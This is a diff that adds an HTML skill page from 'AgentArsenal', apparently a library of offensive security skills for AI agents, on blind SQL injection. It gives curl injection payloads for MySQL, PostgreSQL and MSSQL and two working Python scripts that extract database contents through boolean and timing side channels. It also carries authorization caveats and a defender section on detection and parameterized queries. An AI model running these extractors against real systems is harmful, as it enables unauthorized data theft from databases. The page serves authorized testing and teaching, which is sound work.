@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: sqli-blind</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>sqli-blind</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when SQL injection is confirmed but the application prints</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="web-sqli.html">web-sqli</a></div><div class="deps"><span class="kind">requires:</span> <a href="web-sqli.html">web-sqli</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="api-security-testing.html">api-security-testing</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>curl</td><td>8.5</td></tr><tr><td>Python</td><td>3.12</td></tr><tr><td>sqlmap</td><td>1.9.2</td></tr></tbody></table><p>Blind SQL injection extracts data through side channels: a page that changes between true and false answers (boolean blind) or a response that takes longer on true answers (time blind). This skill covers both, for authorized tests only, including the Python automation that makes blind extraction practical and the binary search trick that halves the request count. It assumes injection is already confirmed; detection is covered by sqli-detection, and visible-output cases belong to sqli-union-extraction.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm the blind channel: a repeatable true/false difference or a</li>
+<p>repeatable timing difference.</p>
+<li>Pick boolean blind when any page difference exists; pick time blind only</li>
+<p>when nothing else differs.</p>
+<li>Write the true/false oracle: one request that answers one yes/no</li>
+<p>question about the data.</p>
+<li>Extract short values first (database name, user, version) to validate the</li>
+<p>oracle.</p>
+<li>Enumerate schema objects with binary search on character codes.</li>
+<li>Dump only the minimum data needed, with delays between requests to avoid</li>
+<p>hammering the target.</p>
+<li>Log request counts and timing so the report shows the work was controlled.</li>
+</ol>
+<h2>1. Boolean-based blind extraction</h2>
+<p>The oracle is a payload that makes the page show state A on true and state B on false. Everything else is asking questions.</p>
+<pre><code class="language-bash"># Confirm the oracle: true shows the welcome text, false does not
+curl -s &quot;https://target.example/item?id=5%20AND%201%3D1--%20-&quot; | grep -c &#x27;Welcome&#x27;
+curl -s &quot;https://target.example/item?id=5%20AND%201%3D2--%20-&quot; | grep -c &#x27;Welcome&#x27;
+
+# Ask: is the first character of the database name &#x27;s&#x27;?
+curl -s &quot;https://target.example/item?id=5%20AND%20SUBSTRING(database(),1,1)%3D&#x27;s&#x27;--%20-&quot; | grep -c &#x27;Welcome&#x27;</code></pre>
+<p>Automate with stdlib Python. Never do this by hand beyond the first few characters.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Boolean-blind extractor: recovers the current database name.&quot;&quot;&quot;
+import time
+import urllib.request
+import urllib.parse
+
+BASE = &quot;https://target.example/item?id=5&quot;
+TRUE_MARKER = b&quot;Welcome&quot;
+DELAY = 0.3
+
+def ask(payload):
+    url = BASE + urllib.parse.quote(payload, safe=&quot;()=&#x27;,&quot;)
+    with urllib.request.urlopen(url, timeout=20) as r:
+        body = r.read()
+    time.sleep(DELAY)
+    return TRUE_MARKER in body
+
+result = &quot;&quot;
+for pos in range(1, 33):
+    found = False
+    for c in &quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;:
+        if ask(f&quot; AND SUBSTRING(database(),{pos},1)=&#x27;{c}&#x27;-- -&quot;):
+            result += c
+            found = True
+            break
+    if not found:
+        break
+    print(f&quot;[*] so far: {result}&quot;, flush=True)</code></pre>
+<p>Binary search on ASCII codes cuts roughly 5x requests versus alphabet scan: ask <code>ASCII(SUBSTRING(...)) &gt; 109</code> style questions and narrow the range.</p>
+<h2>2. Time-based blind extraction</h2>
+<p>Use conditional delays when the page is identical for true and false.</p>
+<pre><code class="language-bash"># MySQL: 3 second delay only when the condition is true
+time curl -s &quot;https://target.example/item?id=5%20AND%20IF(1%3D1,SLEEP(3),0)--%20-&quot; -o /dev/null
+time curl -s &quot;https://target.example/item?id=5%20AND%20IF(1%3D2,SLEEP(3),0)--%20-&quot; -o /dev/null
+
+# PostgreSQL stacked time probe
+time curl -s &quot;https://target.example/item?id=5%3BSELECT%20CASE%20WHEN%20(1%3D1)%20THEN%20pg_sleep(3)%20END--%20-&quot; -o /dev/null
+
+# MSSQL
+time curl -s &quot;https://target.example/item?id=5%3BIF(1%3D1)%20WAITFOR%20DELAY%20&#x27;0:0:3&#x27;--%20-&quot; -o /dev/null</code></pre>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Time-blind oracle: true answer when the response is slow.&quot;&quot;&quot;
+import time
+import urllib.request
+import urllib.parse
+
+BASE = &quot;https://target.example/item?id=5&quot;
+THRESHOLD = 2.0  # seconds; true means slower than this
+
+def ask_time(payload):
+    url = BASE + urllib.parse.quote(payload, safe=&quot;()=,&#x27;&quot;)
+    start = time.time()
+    with urllib.request.urlopen(url, timeout=30) as r:
+        r.read()
+    return (time.time() - start) &gt; THRESHOLD
+
+# Example: binary search one character of the database name
+lo, hi = 32, 126
+while lo &lt; hi:
+    mid = (lo + hi) // 2
+    if ask_time(f&quot; AND IF(ASCII(SUBSTRING(database(),1,1))&gt;{mid},SLEEP(3),0)-- -&quot;):
+        lo = mid + 1
+    else:
+        hi = mid
+print(&quot;[*] first char code:&quot;, lo, &quot;-&gt;&quot;, chr(lo))</code></pre>
+<p>Keep delays at 2 to 4 seconds. Longer delays multiply across thousands of requests and can look like a denial of service. Never run time-blind loops during business hours unless the scope explicitly allows it.</p>
+<h2>3. Reducing request volume</h2>
+<p>Blind extraction is request-heavy, so economize deliberately.</p>
+<pre><code class="language-bash"># Extract hex-encoded data: smaller alphabet (0-9a-f), fewer questions per char
+# SUBSTRING(HEX(password),pos,1) with a 16-char alphabet
+
+# Ask about lengths first so loops know when to stop
+# Boolean: AND (SELECT LENGTH(database()))=8-- -
+# Time: AND IF((SELECT LENGTH(database()))=8,SLEEP(3),0)-- -</code></pre>
+<p>Prefer extracting hashes over plaintext where the goal is only to prove access, and stop at the first row that proves impact. A full table dump over a blind channel is rarely justified and always noisy.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The true/false marker appears on both pages intermittently. The marker is</li>
+<p>unreliable; pick a different string or compare response lengths with a tolerance band instead.</p>
+<li>Network jitter ruins time measurements. Take the median of three runs per</li>
+<p>question and raise the threshold to twice the baseline response time.</p>
+<li>The application caches responses. Add a cache-busting junk parameter that</li>
+<p>is not part of the query (<code>&amp;x=RANDOM</code>) to every request.</p>
+<li>Length limits truncate your payload. Split long questions across stacked</li>
+<p>queries or shorten them with aliases.</p>
+<li>The session expires mid-loop. Re-authenticate inside the script and retry</li>
+<p>the current question instead of restarting.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Boolean blind returns nothing useful: verify the oracle still works with</li>
+<p><code>AND 1=1</code> versus <code>AND 1=2</code> before assuming the technique failed; the injection point may have moved.</p>
+<li>Time blind is too slow for the test window: switch to error-based</li>
+<p>extraction if any error text leaks, or escalate to out-of-band extraction (see sqli-out-of-band) which returns whole values per request.</p>
+<li>The filter blocks SLEEP and BENCHMARK: try heavy queries such as</li>
+<p><code>(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)</code> as a timing source.</p>
+<li>Automation gets rate limited: add exponential backoff, lower concurrency</li>
+<p>to one request at a time, and continue from the saved position file.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see blind extraction as thousands of near-identical requests from one IP with slowly varying payloads, often at regular intervals from a script. Time-based attacks also show as database sessions with long-running <code>SLEEP</code> or <code>pg_sleep</code> calls in the slow query log. Alerting on request bursts per session, slow query monitoring, and WAF rules against timing functions all help. The durable fix remains parameterized queries plus least-privilege database accounts.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application).</li>
+<li>CWE-89 (Improper Neutralization of Special Elements used in an SQL</li>
+<p>Command, SQL Injection).</p>
+<li>OWASP Testing Guide: Testing for Blind SQL Injection.</li>
+<li>PortSwigger Web Security Academy: Blind SQL injection labs.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
